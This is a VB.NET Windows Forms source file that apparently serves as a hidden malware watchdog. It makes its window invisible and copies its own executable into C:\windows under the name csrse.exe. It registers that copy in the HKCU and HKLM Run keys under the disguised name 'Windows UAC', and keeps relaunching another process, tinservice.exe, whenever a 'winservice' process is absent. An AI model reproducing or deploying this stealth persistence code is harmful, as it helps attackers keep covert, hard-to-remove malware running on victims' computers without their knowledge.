﻿Imports Microsoft.Win32

Public Class Form1
    Private Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Dim RunningProcesses As Process() = Process.GetProcessesByName(Process.GetCurrentProcess.ProcessName)
            If (RunningProcesses.Length > 1) Then
                GC.Collect()
                End
            End If
            Me.Hide()
            Me.Opacity = 0
            Me.Visible = False
            Me.ShowIcon = False
            Me.ShowInTaskbar = False
            Call AutoS()
            Timer1.Start()
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
Label:
        If IO.File.Exists("C:\windows\" & "\winservice.exe") = False Then
            Try
                Process.Start("C:\windows\" & "\tinservice.exe")
            Catch ex As Exception
                GoTo Label
            End Try
        End If
    End Sub
    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
Label:
        Call FlushMemory()
        If ChkExeExist("winservice") = False Then
            Try
                Process.Start("C:\windows\" & "\tinservice.exe")
            Catch ex As Exception
                GoTo Label
            End Try
        End If
    End Sub

    Private Sub AutoS()
        Try
            Dim appname As String = IO.Path.GetFileName(Application.ExecutablePath)
            If My.Computer.FileSystem.FileExists("C:\windows\" & "\csrse.exe") = True Then
                Call AddToStartup("Windows UAC", "C:\windows" & "\csrse.exe")
            Else
                My.Computer.FileSystem.CopyFile(Application.StartupPath & "\" & appname, "C:\windows\" & "\csrse.exe")
                Call AddToStartup("Windows UAC", "C:\windows" & "\csrse.exe")
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub AddToStartup(ByVal name As String, ByVal path As String)
        Dim key3 As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Dim key4 As RegistryKey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        key3.SetValue(name, path)
        key3.Close()
        key4.SetValue(name, path)
        key4.Close()
    End Sub
    Public Shared Sub FlushMemory()
        GC.Collect()
        GC.WaitForPendingFinalizers()
        If (Environment.OSVersion.Platform = PlatformID.Win32NT) Then
            SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
        End If
    End Sub
    Public Function ChkExeExist(ByVal strName As String) As Boolean
        ChkExeExist = False
        Dim clsProcess As New Process
        For Each clsProcess In Process.GetProcesses
            If clsProcess.ProcessName = strName Then
                Return True
                Exit Function
            End If
        Next
    End Function
End Class
